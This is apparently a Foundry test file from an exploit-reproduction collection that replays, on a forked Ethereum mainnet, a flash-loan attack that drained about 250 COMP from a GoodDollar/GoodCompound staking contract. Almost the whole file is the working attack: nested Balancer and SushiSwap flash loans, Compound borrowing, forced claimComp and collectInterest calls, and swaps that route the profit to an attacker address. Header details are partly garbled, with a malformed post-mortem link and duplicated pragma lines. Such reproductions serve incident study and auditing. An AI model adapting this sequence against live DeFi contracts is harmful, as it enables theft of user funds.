// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";

// @KeyInfo - Total Lost : ~$13K (250 COMP Token)
// Attacker : https://etherscan.io/address/0xdfab184bc668f16c1cb949228068588106924569
// Attack Contract : https://etherscan.io/address/0x2d89fb83c66b6c7c35818382517959e33a655b13
// Vulnerable Contract : https://etherscan.io/address/0x3d9819210a31b4961b30ef54be2aed79b9c9cd3b
// Attack Tx : https://etherscan.io/tx/0x1106418384414ed56cd7cbb9fedc66a02d39b663d580abc618f2d387348354ab

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x3d9819210a31b4961b30ef54be2aed79b9c9cd3b#code

// @Analysis
// Post-mortem : getherscan.io/tx/0x1106418384414ed56cd7cbb9fedc66a02d39b663d580abc618f2d387348354ab
// Twitter Guy : 
// Hacking God : 
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "./../interface.sol";

interface IComptroller {
    function enterMarkets(address[] memory) external;
    function claimComp(address, address[] memory) external;
}

interface ICompoundToken {
    function borrow(uint256 borrowAmount) external;
    function repayBorrow(uint256 repayAmount) external;
    function redeem(uint256 redeemAmount) external;
    function mint(uint256 amount) external;
    function comptroller() external view returns (address);
}

interface IGoodFundManager {
    function collectInterest(address[] memory, bool) external;
}

contract GoodCompound is BaseTestWithBalanceLog {
    address balancer_vault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    IBalancerVault balancer = IBalancerVault(balancer_vault);

    address profit_receiver = 0xa8Ca14Af6ef32A1Be44652CA13d0071bf855f8DD;

    address compound = 0xc00e94Cb662C3520282E6f5717214004A7f26888;
    IERC20 compound_token = IERC20(compound);
    address weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    IERC20 weth_token = IERC20(weth);

    address ceth = 0x4Ddc2D193948926D02f9B1fE9e1daa0718270ED5;
    IERC20 ceth_token = IERC20(ceth);

    address compound_comptroller = 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B;
    address ccompound_token = 0x70e36f6BF80a52b3B46b3aF8e106CC0ed743E8e4;

    address sushi = 0x31503dcb60119A812feE820bb7042752019F2355;

    address univ2_router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    IUniswapV2Router univ2 = IUniswapV2Router(payable(univ2_router));

    address goodCompoundStaking = 0x7b7246C78e2F900D17646FF0CB2EC47D6BA10754;
    address cdai = 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643;

    address proxy = 0x0c6C80D2061afA35E160F3799411d83BDEEA0a5A;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    uint256 public maxUint = type(uint256).max;

    address ctoken_address = 0x4Ddc2D193948926D02f9B1fE9e1daa0718270ED5;
    IERC20 ctoken = IERC20(ctoken_address);

    function setUp() public {
        cheats.createSelectFork("mainnet", 18_759_541-1);
        deal(address(ctoken), address(this), 2240854452867); // initial tokens for setting ctoken snapshot
        cheats.prank(profit_receiver);
        compound_token.approve(address(this), maxUint); // approve for transfer
    }


    function testExploit() public {
        emit log_named_decimal_uint("[Begin] Attacker COMP before exploit", compound_token.balanceOf(profit_receiver), 18);
        address[] memory path = new address[](2);
        path[0] = address(compound);
        path[1] = address(weth);
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 894410483325707881040;
        amounts[1] = 55693783410001174957472;
        balancer.flashLoan(address(this), path, amounts, "");
        emit log_named_decimal_uint("[End] Attacker COMP after exploit", compound_token.balanceOf(profit_receiver), 18);
    }

    function receiveFlashLoan(address[] memory tokens, uint256[] memory amounts, uint256[] memory feeAmounts, bytes calldata userData) external {
        weth_token.withdraw(amounts[1]);

        bytes memory data1 = abi.encodeWithSignature("mint()");
        (bool success1, ) = ceth.call{value: 450}(data1);
        require(success1, "Call failed");

        address[] memory markets = new address[](1);
        markets[0] = ceth;
        IComptroller(compound_comptroller).enterMarkets(markets);
        ICompoundToken(ccompound_token).borrow(14995000000000000000000);
        // double flashloan
        ISushiSwap(sushi).swap(4200000000000000000000, 0, address(this), "0x30");

        IERC20(compound_token).approve(ccompound_token,maxUint);
        ICompoundToken(ccompound_token).repayBorrow(14995000000000000000000);
        ICompoundToken(ceth).redeem(ceth_token.balanceOf(address(this)));
        // deposit to exchange weth
        bytes memory data2 = abi.encodeWithSignature("deposit()");
        (bool success2, ) = weth.call{value: 450 ether}(data2);
        require(success2, "Call failed");

        // payback
        weth_token.transfer(balancer_vault, 55693783410001174957472);
        compound_token.transfer(balancer_vault, 894410483325707881040);
        // transfer profit to a designated address
        compound_token.transfer(profit_receiver, compound_token.balanceOf(address(this)));
    }

    function uniswapV2Call(address _sender, uint256 _amount0, uint256 _amount1, bytes calldata _data) external {
        compound_token.approve(univ2_router, maxUint);
        weth_token.approve(univ2_router, maxUint);

        compound_token.transferFrom(profit_receiver, address(this), 7400000000000000000);
        uint256 compound_balance = compound_token.balanceOf(address(this));

        address[] memory path = new address[](2);
        path[0] = compound;
        path[1] = weth;
        univ2.swapExactTokensForTokens(compound_balance, 1, path, address(this), block.timestamp << 1);

        address[] memory path2 = new address[](1);
        path2[0] = cdai;
        IComptroller(compound_comptroller).claimComp(goodCompoundStaking, path2);

        address[] memory markets = new address[](5);
        markets[0] = goodCompoundStaking;
        markets[1] = goodCompoundStaking;
        markets[2] = goodCompoundStaking;
        markets[3] = goodCompoundStaking;
        markets[4] = goodCompoundStaking;
        IGoodFundManager(proxy).collectInterest(markets, true);
        uint256 weth_balance = weth_token.balanceOf(address(this));

        // swap back
        address[] memory path3 = new address[](2);
        path3[0] = weth;
        path3[1] = compound;
        univ2.swapExactTokensForTokens(weth_balance, 1, path3, address(this), block.timestamp << 1);

        compound_token.transfer(sushi, 4206320627691200181954); // pay back

        bytes memory data = abi.encodeWithSignature("deposit()");
        (bool success, ) = weth.call{value: 55244 ether}(data);
        require(success, "Call failed");

        weth_token.transfer(sushi, 149285130679667947); // calculated according to reserves
    }

    fallback() external payable {}
}